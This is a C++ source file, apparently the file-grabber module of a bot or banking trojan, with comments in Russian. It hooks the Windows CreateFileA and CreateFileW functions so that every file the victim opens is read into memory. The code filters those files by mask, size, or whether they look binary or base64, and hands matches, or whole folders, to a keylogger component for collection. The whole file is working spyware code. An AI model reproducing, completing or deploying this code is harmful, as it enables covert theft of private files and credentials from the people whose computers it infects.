#include "UniversalKeyLogger.h"
#include "FileGrabber.h"
#include "Memory.h"
#include "String.h"
#include "GetApi.h"
#include "Utils.h"
#include "Splice.h"
#include "Unhook.h"

#include "BotDebug.h"

namespace FILEGRABBERDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// Объявляем шаблон вывода отладочных строк
#define DBG FILEGRABBERDEBUGSTRINGS::DBGOutMessage<>

namespace FileGrabber {

TypeCreateFileW Real_CreateFileW;
TypeCreateFileA Real_CreateFileA;

PList receivers = 0; //получатели
DWORD PID = 0; //для предотвращения повторной инициализации
int stateGrabber = 0; //состояние граббера

bool IsBin( BYTE* data, int szData )
{
	//считаем частоту символов
	int s[256];
	m_memset(s, 0, sizeof(s));

	for( int i = 0; i < szData; i++ ) s[data[i]]++;

	//средняя частота символа
	int avg = szData / 256;
	//начало и конец диапазона равномерно распределенных частот
	int min = avg - avg / 2 - 1; if( min <= 0 ) min = 1;
	int max = avg + avg / 2 + 1;
	//подсчитываем количество попаданий частот в диапазоне [m1;m2]
   	int m1 = 0, m2 = 0;
	for( int i = 0; i < 256; i++ )
		if( s[i] )
			if( min <= s[i] && s[i] <= max )
				m1++;
			else
				m2++;
	//если частоты равномерно распределены, то количество попаданий
	//должно быть примерно на 25% больше
	if( m1 * 75 / 100 > m2 )
		return true;
	return false;
}

//проверяет являются ли данные кодировкой base64
bool IsBase64( BYTE* data, int szData )
{
	int sz = 0; //количество символов в data, исключаются переводі строк
	int max = 0; //максимальная длина последовательности символов кодировки base64
	int len = 0; //подсчет строчки символов
	int rows = 0; //количество строк
	for( int i = 0; i < szData; i++ )
	{
		char c = data[i];
		if( c != 13 && c != 10 ) 
		{
			if( (c >= 'A' && c <= 'Z') ||
				(c >= 'a' && c <= 'z') ||
				(c >= '0' && c <= '9') ||
				c == '+' || c == '/' || c == '=' ) len++;
			else
				if( len > max )
					max = len;
				else
					len = 0;
			sz++;
		}
		else
			rows++;

	}
	if( len * 100 / sz > 70 && rows > 0 ) //большинство текста это кодировка base64, а ткаже если разбиты на строки
		return true;
	return false;
}

//Проверяет каждого получателя и отсылаем им оповещения о срабатывании хука, согласно условиям получателя
void SendEvent( ParamEvent& e )
{
	if( !receivers )
		return;
	int count = List::Count(receivers);
	for( int i = 0; i < count; i++ )
	{
		Receiver* rv = (Receiver*)List::GetItem( receivers, i );
		if( e.access & rv->access ) //тип доступа
		{
			DWORD h;
 			e.szData = (DWORD)pGetFileSize( e.file, &h );
			//подходит ли размер
			if( e.szData >= rv->minSize && (e.szData <= rv->maxSize || rv->maxSize < 0))
			{
				bool send = true; //слать событие или нет
				
				//загружаем файл
				if( rv->maska || rv->aw & (LOADFILE | FILEISBIN) || rv->ignoreBeg[0][0] )
				{
					e.data = (BYTE*)MemAlloc(e.szData + 1); //на 1 больше для конечного нуля, чтобы потом проводить поиск по маске
					if( e.data ) 
					{
						DWORD size = 0;
						pReadFile( e.file, e.data, e.szData, &size, NULL ); //читаем весь файл в память
						pSetFilePointer( e.file, 0, 0, FILE_BEGIN );
						if( size == e.szData ) //действительно все прочли
						{
							((char*)e.data)[e.szData] = 0; //файл представляем как строку

							//игнорируем файлы указанных форматов
							int n = 0;
							while( rv->ignoreBeg[n][0] && send && n < MaxIgnoreBeg )
							{
								for( int i = 0; i <= MaxLenIgnoreBeg; i++ )
								{
									if( i == MaxLenIgnoreBeg || (rv->ignoreBeg[n][i] == 0 && i > 0) ) //строка совпала
									{
										send = false;
										break;
									}
									if( rv->ignoreBeg[n][i] != e.data[i] )
										break;
								}
								n++;
							}
						}
						else
							send = false;
						
						if( send )
						{
							//если есть какой-то из фильтров, то сообщаем только тогда когда есть реакция на один из них
							bool filters = false; //проходил ли через какой-то фильтер
							for(;;)
							{
								//проверяем маску
								if( rv->maska )
								{
									filters = true;
									send = WildCmp( (char*)e.data, rv->maska );
									if( send ) break;
								}
	
								if( rv->aw & FILEISBIN )
								{
									filters = true;
									send = IsBin( (BYTE*)e.data, e.szData );
									if( send ) break;
								}

								if( rv->aw & FILEISBASE64 )
								{
									filters = true;
									send = IsBase64( (BYTE*)e.data, e.szData );
									if( send ) break;
								}
								if( filters ) send = false; //если ни один из фильтров не сработал, то сообщение не шлем
								break;
							}
						}
					}
					else
						send = false;
				}
				if( rv->FuncReceiver && send )
				{
					e.nameSend[0] = 0;
					if( e.unicode )
					{
						DBG("FileGrabberW", "Отреагировали на файл '%ls', size: %d", e.fileNameW, e.szData );
						e.fileName = WSTR::ToAnsi( e.fileNameW, 0 );
					}
					else
					{
						DBG("FileGrabberA", "Отреагировали на файл '%s', size: %d", e.fileNameA, e.szData );
						e.fileName = (char*)e.fileNameA;
					}

					e.shortName = File::ExtractFileNameA( e.fileName, false );
					//ищем расширение
					e.extFile = 0;
					const char* p = STR::End((char*)e.shortName); 
					while( p >= e.shortName )
						if( *p == '.' )
						{
							e.extFile = p + 1; 
							break;
						}
						else
							p--;

					int res = rv->FuncReceiver(&e);
					if( res & SENDFILE ) //если возвращает SENDFILE, то отправляем содержимое
					{
						if( e.data )
						{
							const char* nameSend = "FileGrabber";
							if( res & CURRNAMEFILE ) //извлекаем имя из полного имени файла
								nameSend = e.shortName;
							else
								if( res & CURRFULLNAMEFILE ) //имя файла с полными путями
									nameSend = e.fileName;
								else
									if( e.nameSend[0] ) //имя передал получатель
										nameSend = e.nameSend;
							if( e.unicode )
								DBG("FileGrabberW", "Отправили файл '%ls' под именем '%s'", e.fileNameW, nameSend );
							else
								DBG("FileGrabberA", "Отправили файл '%s' под именем '%s'", e.fileNameA, nameSend );
							KeyLogger::AddFile( 0, (char*)nameSend, e.data, e.szData );
						}
					}
					else 
						if( res & SENDFOLDER )
						{
							pPathRemoveFileSpecA(e.fileName);
							//добавляем в конце слеш, так функция PathRemoveFileSpec его убирает
							int sz = m_lstrlen(e.fileName);
							e.fileName[sz] = '\\';
							e.fileName[sz + 1] = 0;
							DBG( "FileGrabber", "Отправляем папку '%s' под именем '%s'", e.fileName, e.nameSend );
							int currState = stateGrabber;
							stateGrabber |= IGNOREHOOK; //отключаем граббер
							KeyLogger::AddDirectory( e.fileName, e.nameSend );
							stateGrabber = currState; //восстанавливаем состояние
						}
					if( e.fileName != e.fileNameA ) //освобождаем память, если была перекодировка
						STR::Free(e.fileName);
				}
				MemFree(e.data);
			}
		}
	}
}

HANDLE WINAPI Hook_CreateFileA( LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile )
{
	HANDLE File = Real_CreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );
	if( (stateGrabber & IGNOREHOOK) == 0 && (dwFlagsAndAttributes & FILE_FLAG_OVERLAPPED) == 0 && lpFileName && lpFileName[0] != '/' && lpFileName[0] != '\\' ) //игнорируем открытие разных портов
	{
	//DBG("FileGrabberA", "%s", lpFileName);
		//инициализация параметров события
		ParamEvent e;
		e.data = 0;
		e.szData = 0;
		m_lstrcpy( e.fileNameA, lpFileName );
		e.unicode = false;
		e.access = dwDesiredAccess;
		e.file = File;
		SendEvent(e); //посылаем событие
	}
	return File;
}

HANDLE WINAPI Hook_CreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile )
{
	HANDLE File = Real_CreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );
	if( (stateGrabber & IGNOREHOOK) == 0 && (dwFlagsAndAttributes & FILE_FLAG_OVERLAPPED) == 0 && lpFileName && lpFileName[0] != '/' && lpFileName[0] != '\\' ) //игнорируем открытие разных портов
	{
	//DBG("FileGrabberW", "%ls", lpFileName);
		//инициализация параметров события
		ParamEvent e;
		e.data = 0;
		e.szData = 0;
		int len = m_wcslen(lpFileName);
		m_memcpy( e.fileNameW, lpFileName, sizeof(WCHAR) * (len + 1) );
		e.unicode = true;
		e.access = dwDesiredAccess;
		e.file = File;
		SendEvent(e); //посылаем событие
		//DBG( "FileGrabberW", "- %ls, %ls", lpFileName, e.fileNameW );
		/*
		if( !m_wcsncmp( (WCHAR*)lpFileName, e.fileNameW, len ) )
		{
			DBG( "FileGrabberW", "%ls != %ls", lpFileName, e.fileNameW );
			m_memcpy( (void*)lpFileName, e.fileNameW, sizeof(WCHAR) * (len + 1) );
		}
		*/
	}
	return File;
}

//удаление получателя при уничтожении списка
void DelReceiver(void* p)
{
	MemFree(p);
}

bool Init( int flags )
{
	if( !IsNewProcess(PID) ) //в том же процессе, инициализация уже была
		return true; //инициализация уже была, поэтому говорим, что инициализация успешная
	receivers = List::Create();
	if( !receivers )
		return false;
	List::SetFreeItemMehod( receivers, DelReceiver ); //для автоматического удаления получателей
	if( flags & CREATEFILEA )
	{
		if (!HookApi(1, Hash_CreateFileA, &Hook_CreateFileA, &Real_CreateFileA ) )
			return false;
	}
	if( flags & CREATEFILEW )
	{
		if (!HookApi(1, Hash_CreateFileW, &Hook_CreateFileW, &Real_CreateFileW ) )
			return false;
	}
	stateGrabber = 0;
	return true;
}

void Release()
{
	UnhookCreateFile();
	List::Free(receivers);
	receivers = 0;
	PID = 0;
	stateGrabber = 0;
}

Receiver* CreateReceiver()
{
	Receiver* ret = (Receiver*)MemAlloc( sizeof(Receiver) );
	ret->access = GENERIC_READ;
	ret->aw = CREATEFILEA | CREATEFILEW;
	return ret;
}

bool AddReceiver( Receiver* rv )
{
	if( receivers )
	{
		List::Add( receivers, rv );
		return true;
	}
	return false;
}

 //добавляет игнорируемые форматы файлов, которые указываются в начале файла
bool AddIgnoreBeg( Receiver* rv, const char* beg )
{
	for( int i = 0; i < MaxIgnoreBeg; i++ )
		if( rv->ignoreBeg[i][0] == 0 )
		{
			int j;
			for( j = 0; j < MaxLenIgnoreBeg && beg[j]; j++ )
				rv->ignoreBeg[i][j] = beg[j];
			//остаток забиваем нулями
			for( ; j < MaxLenIgnoreBeg; j++ )
				rv->ignoreBeg[i][j] = 0;
			return true;
		}
	return false;
}

};

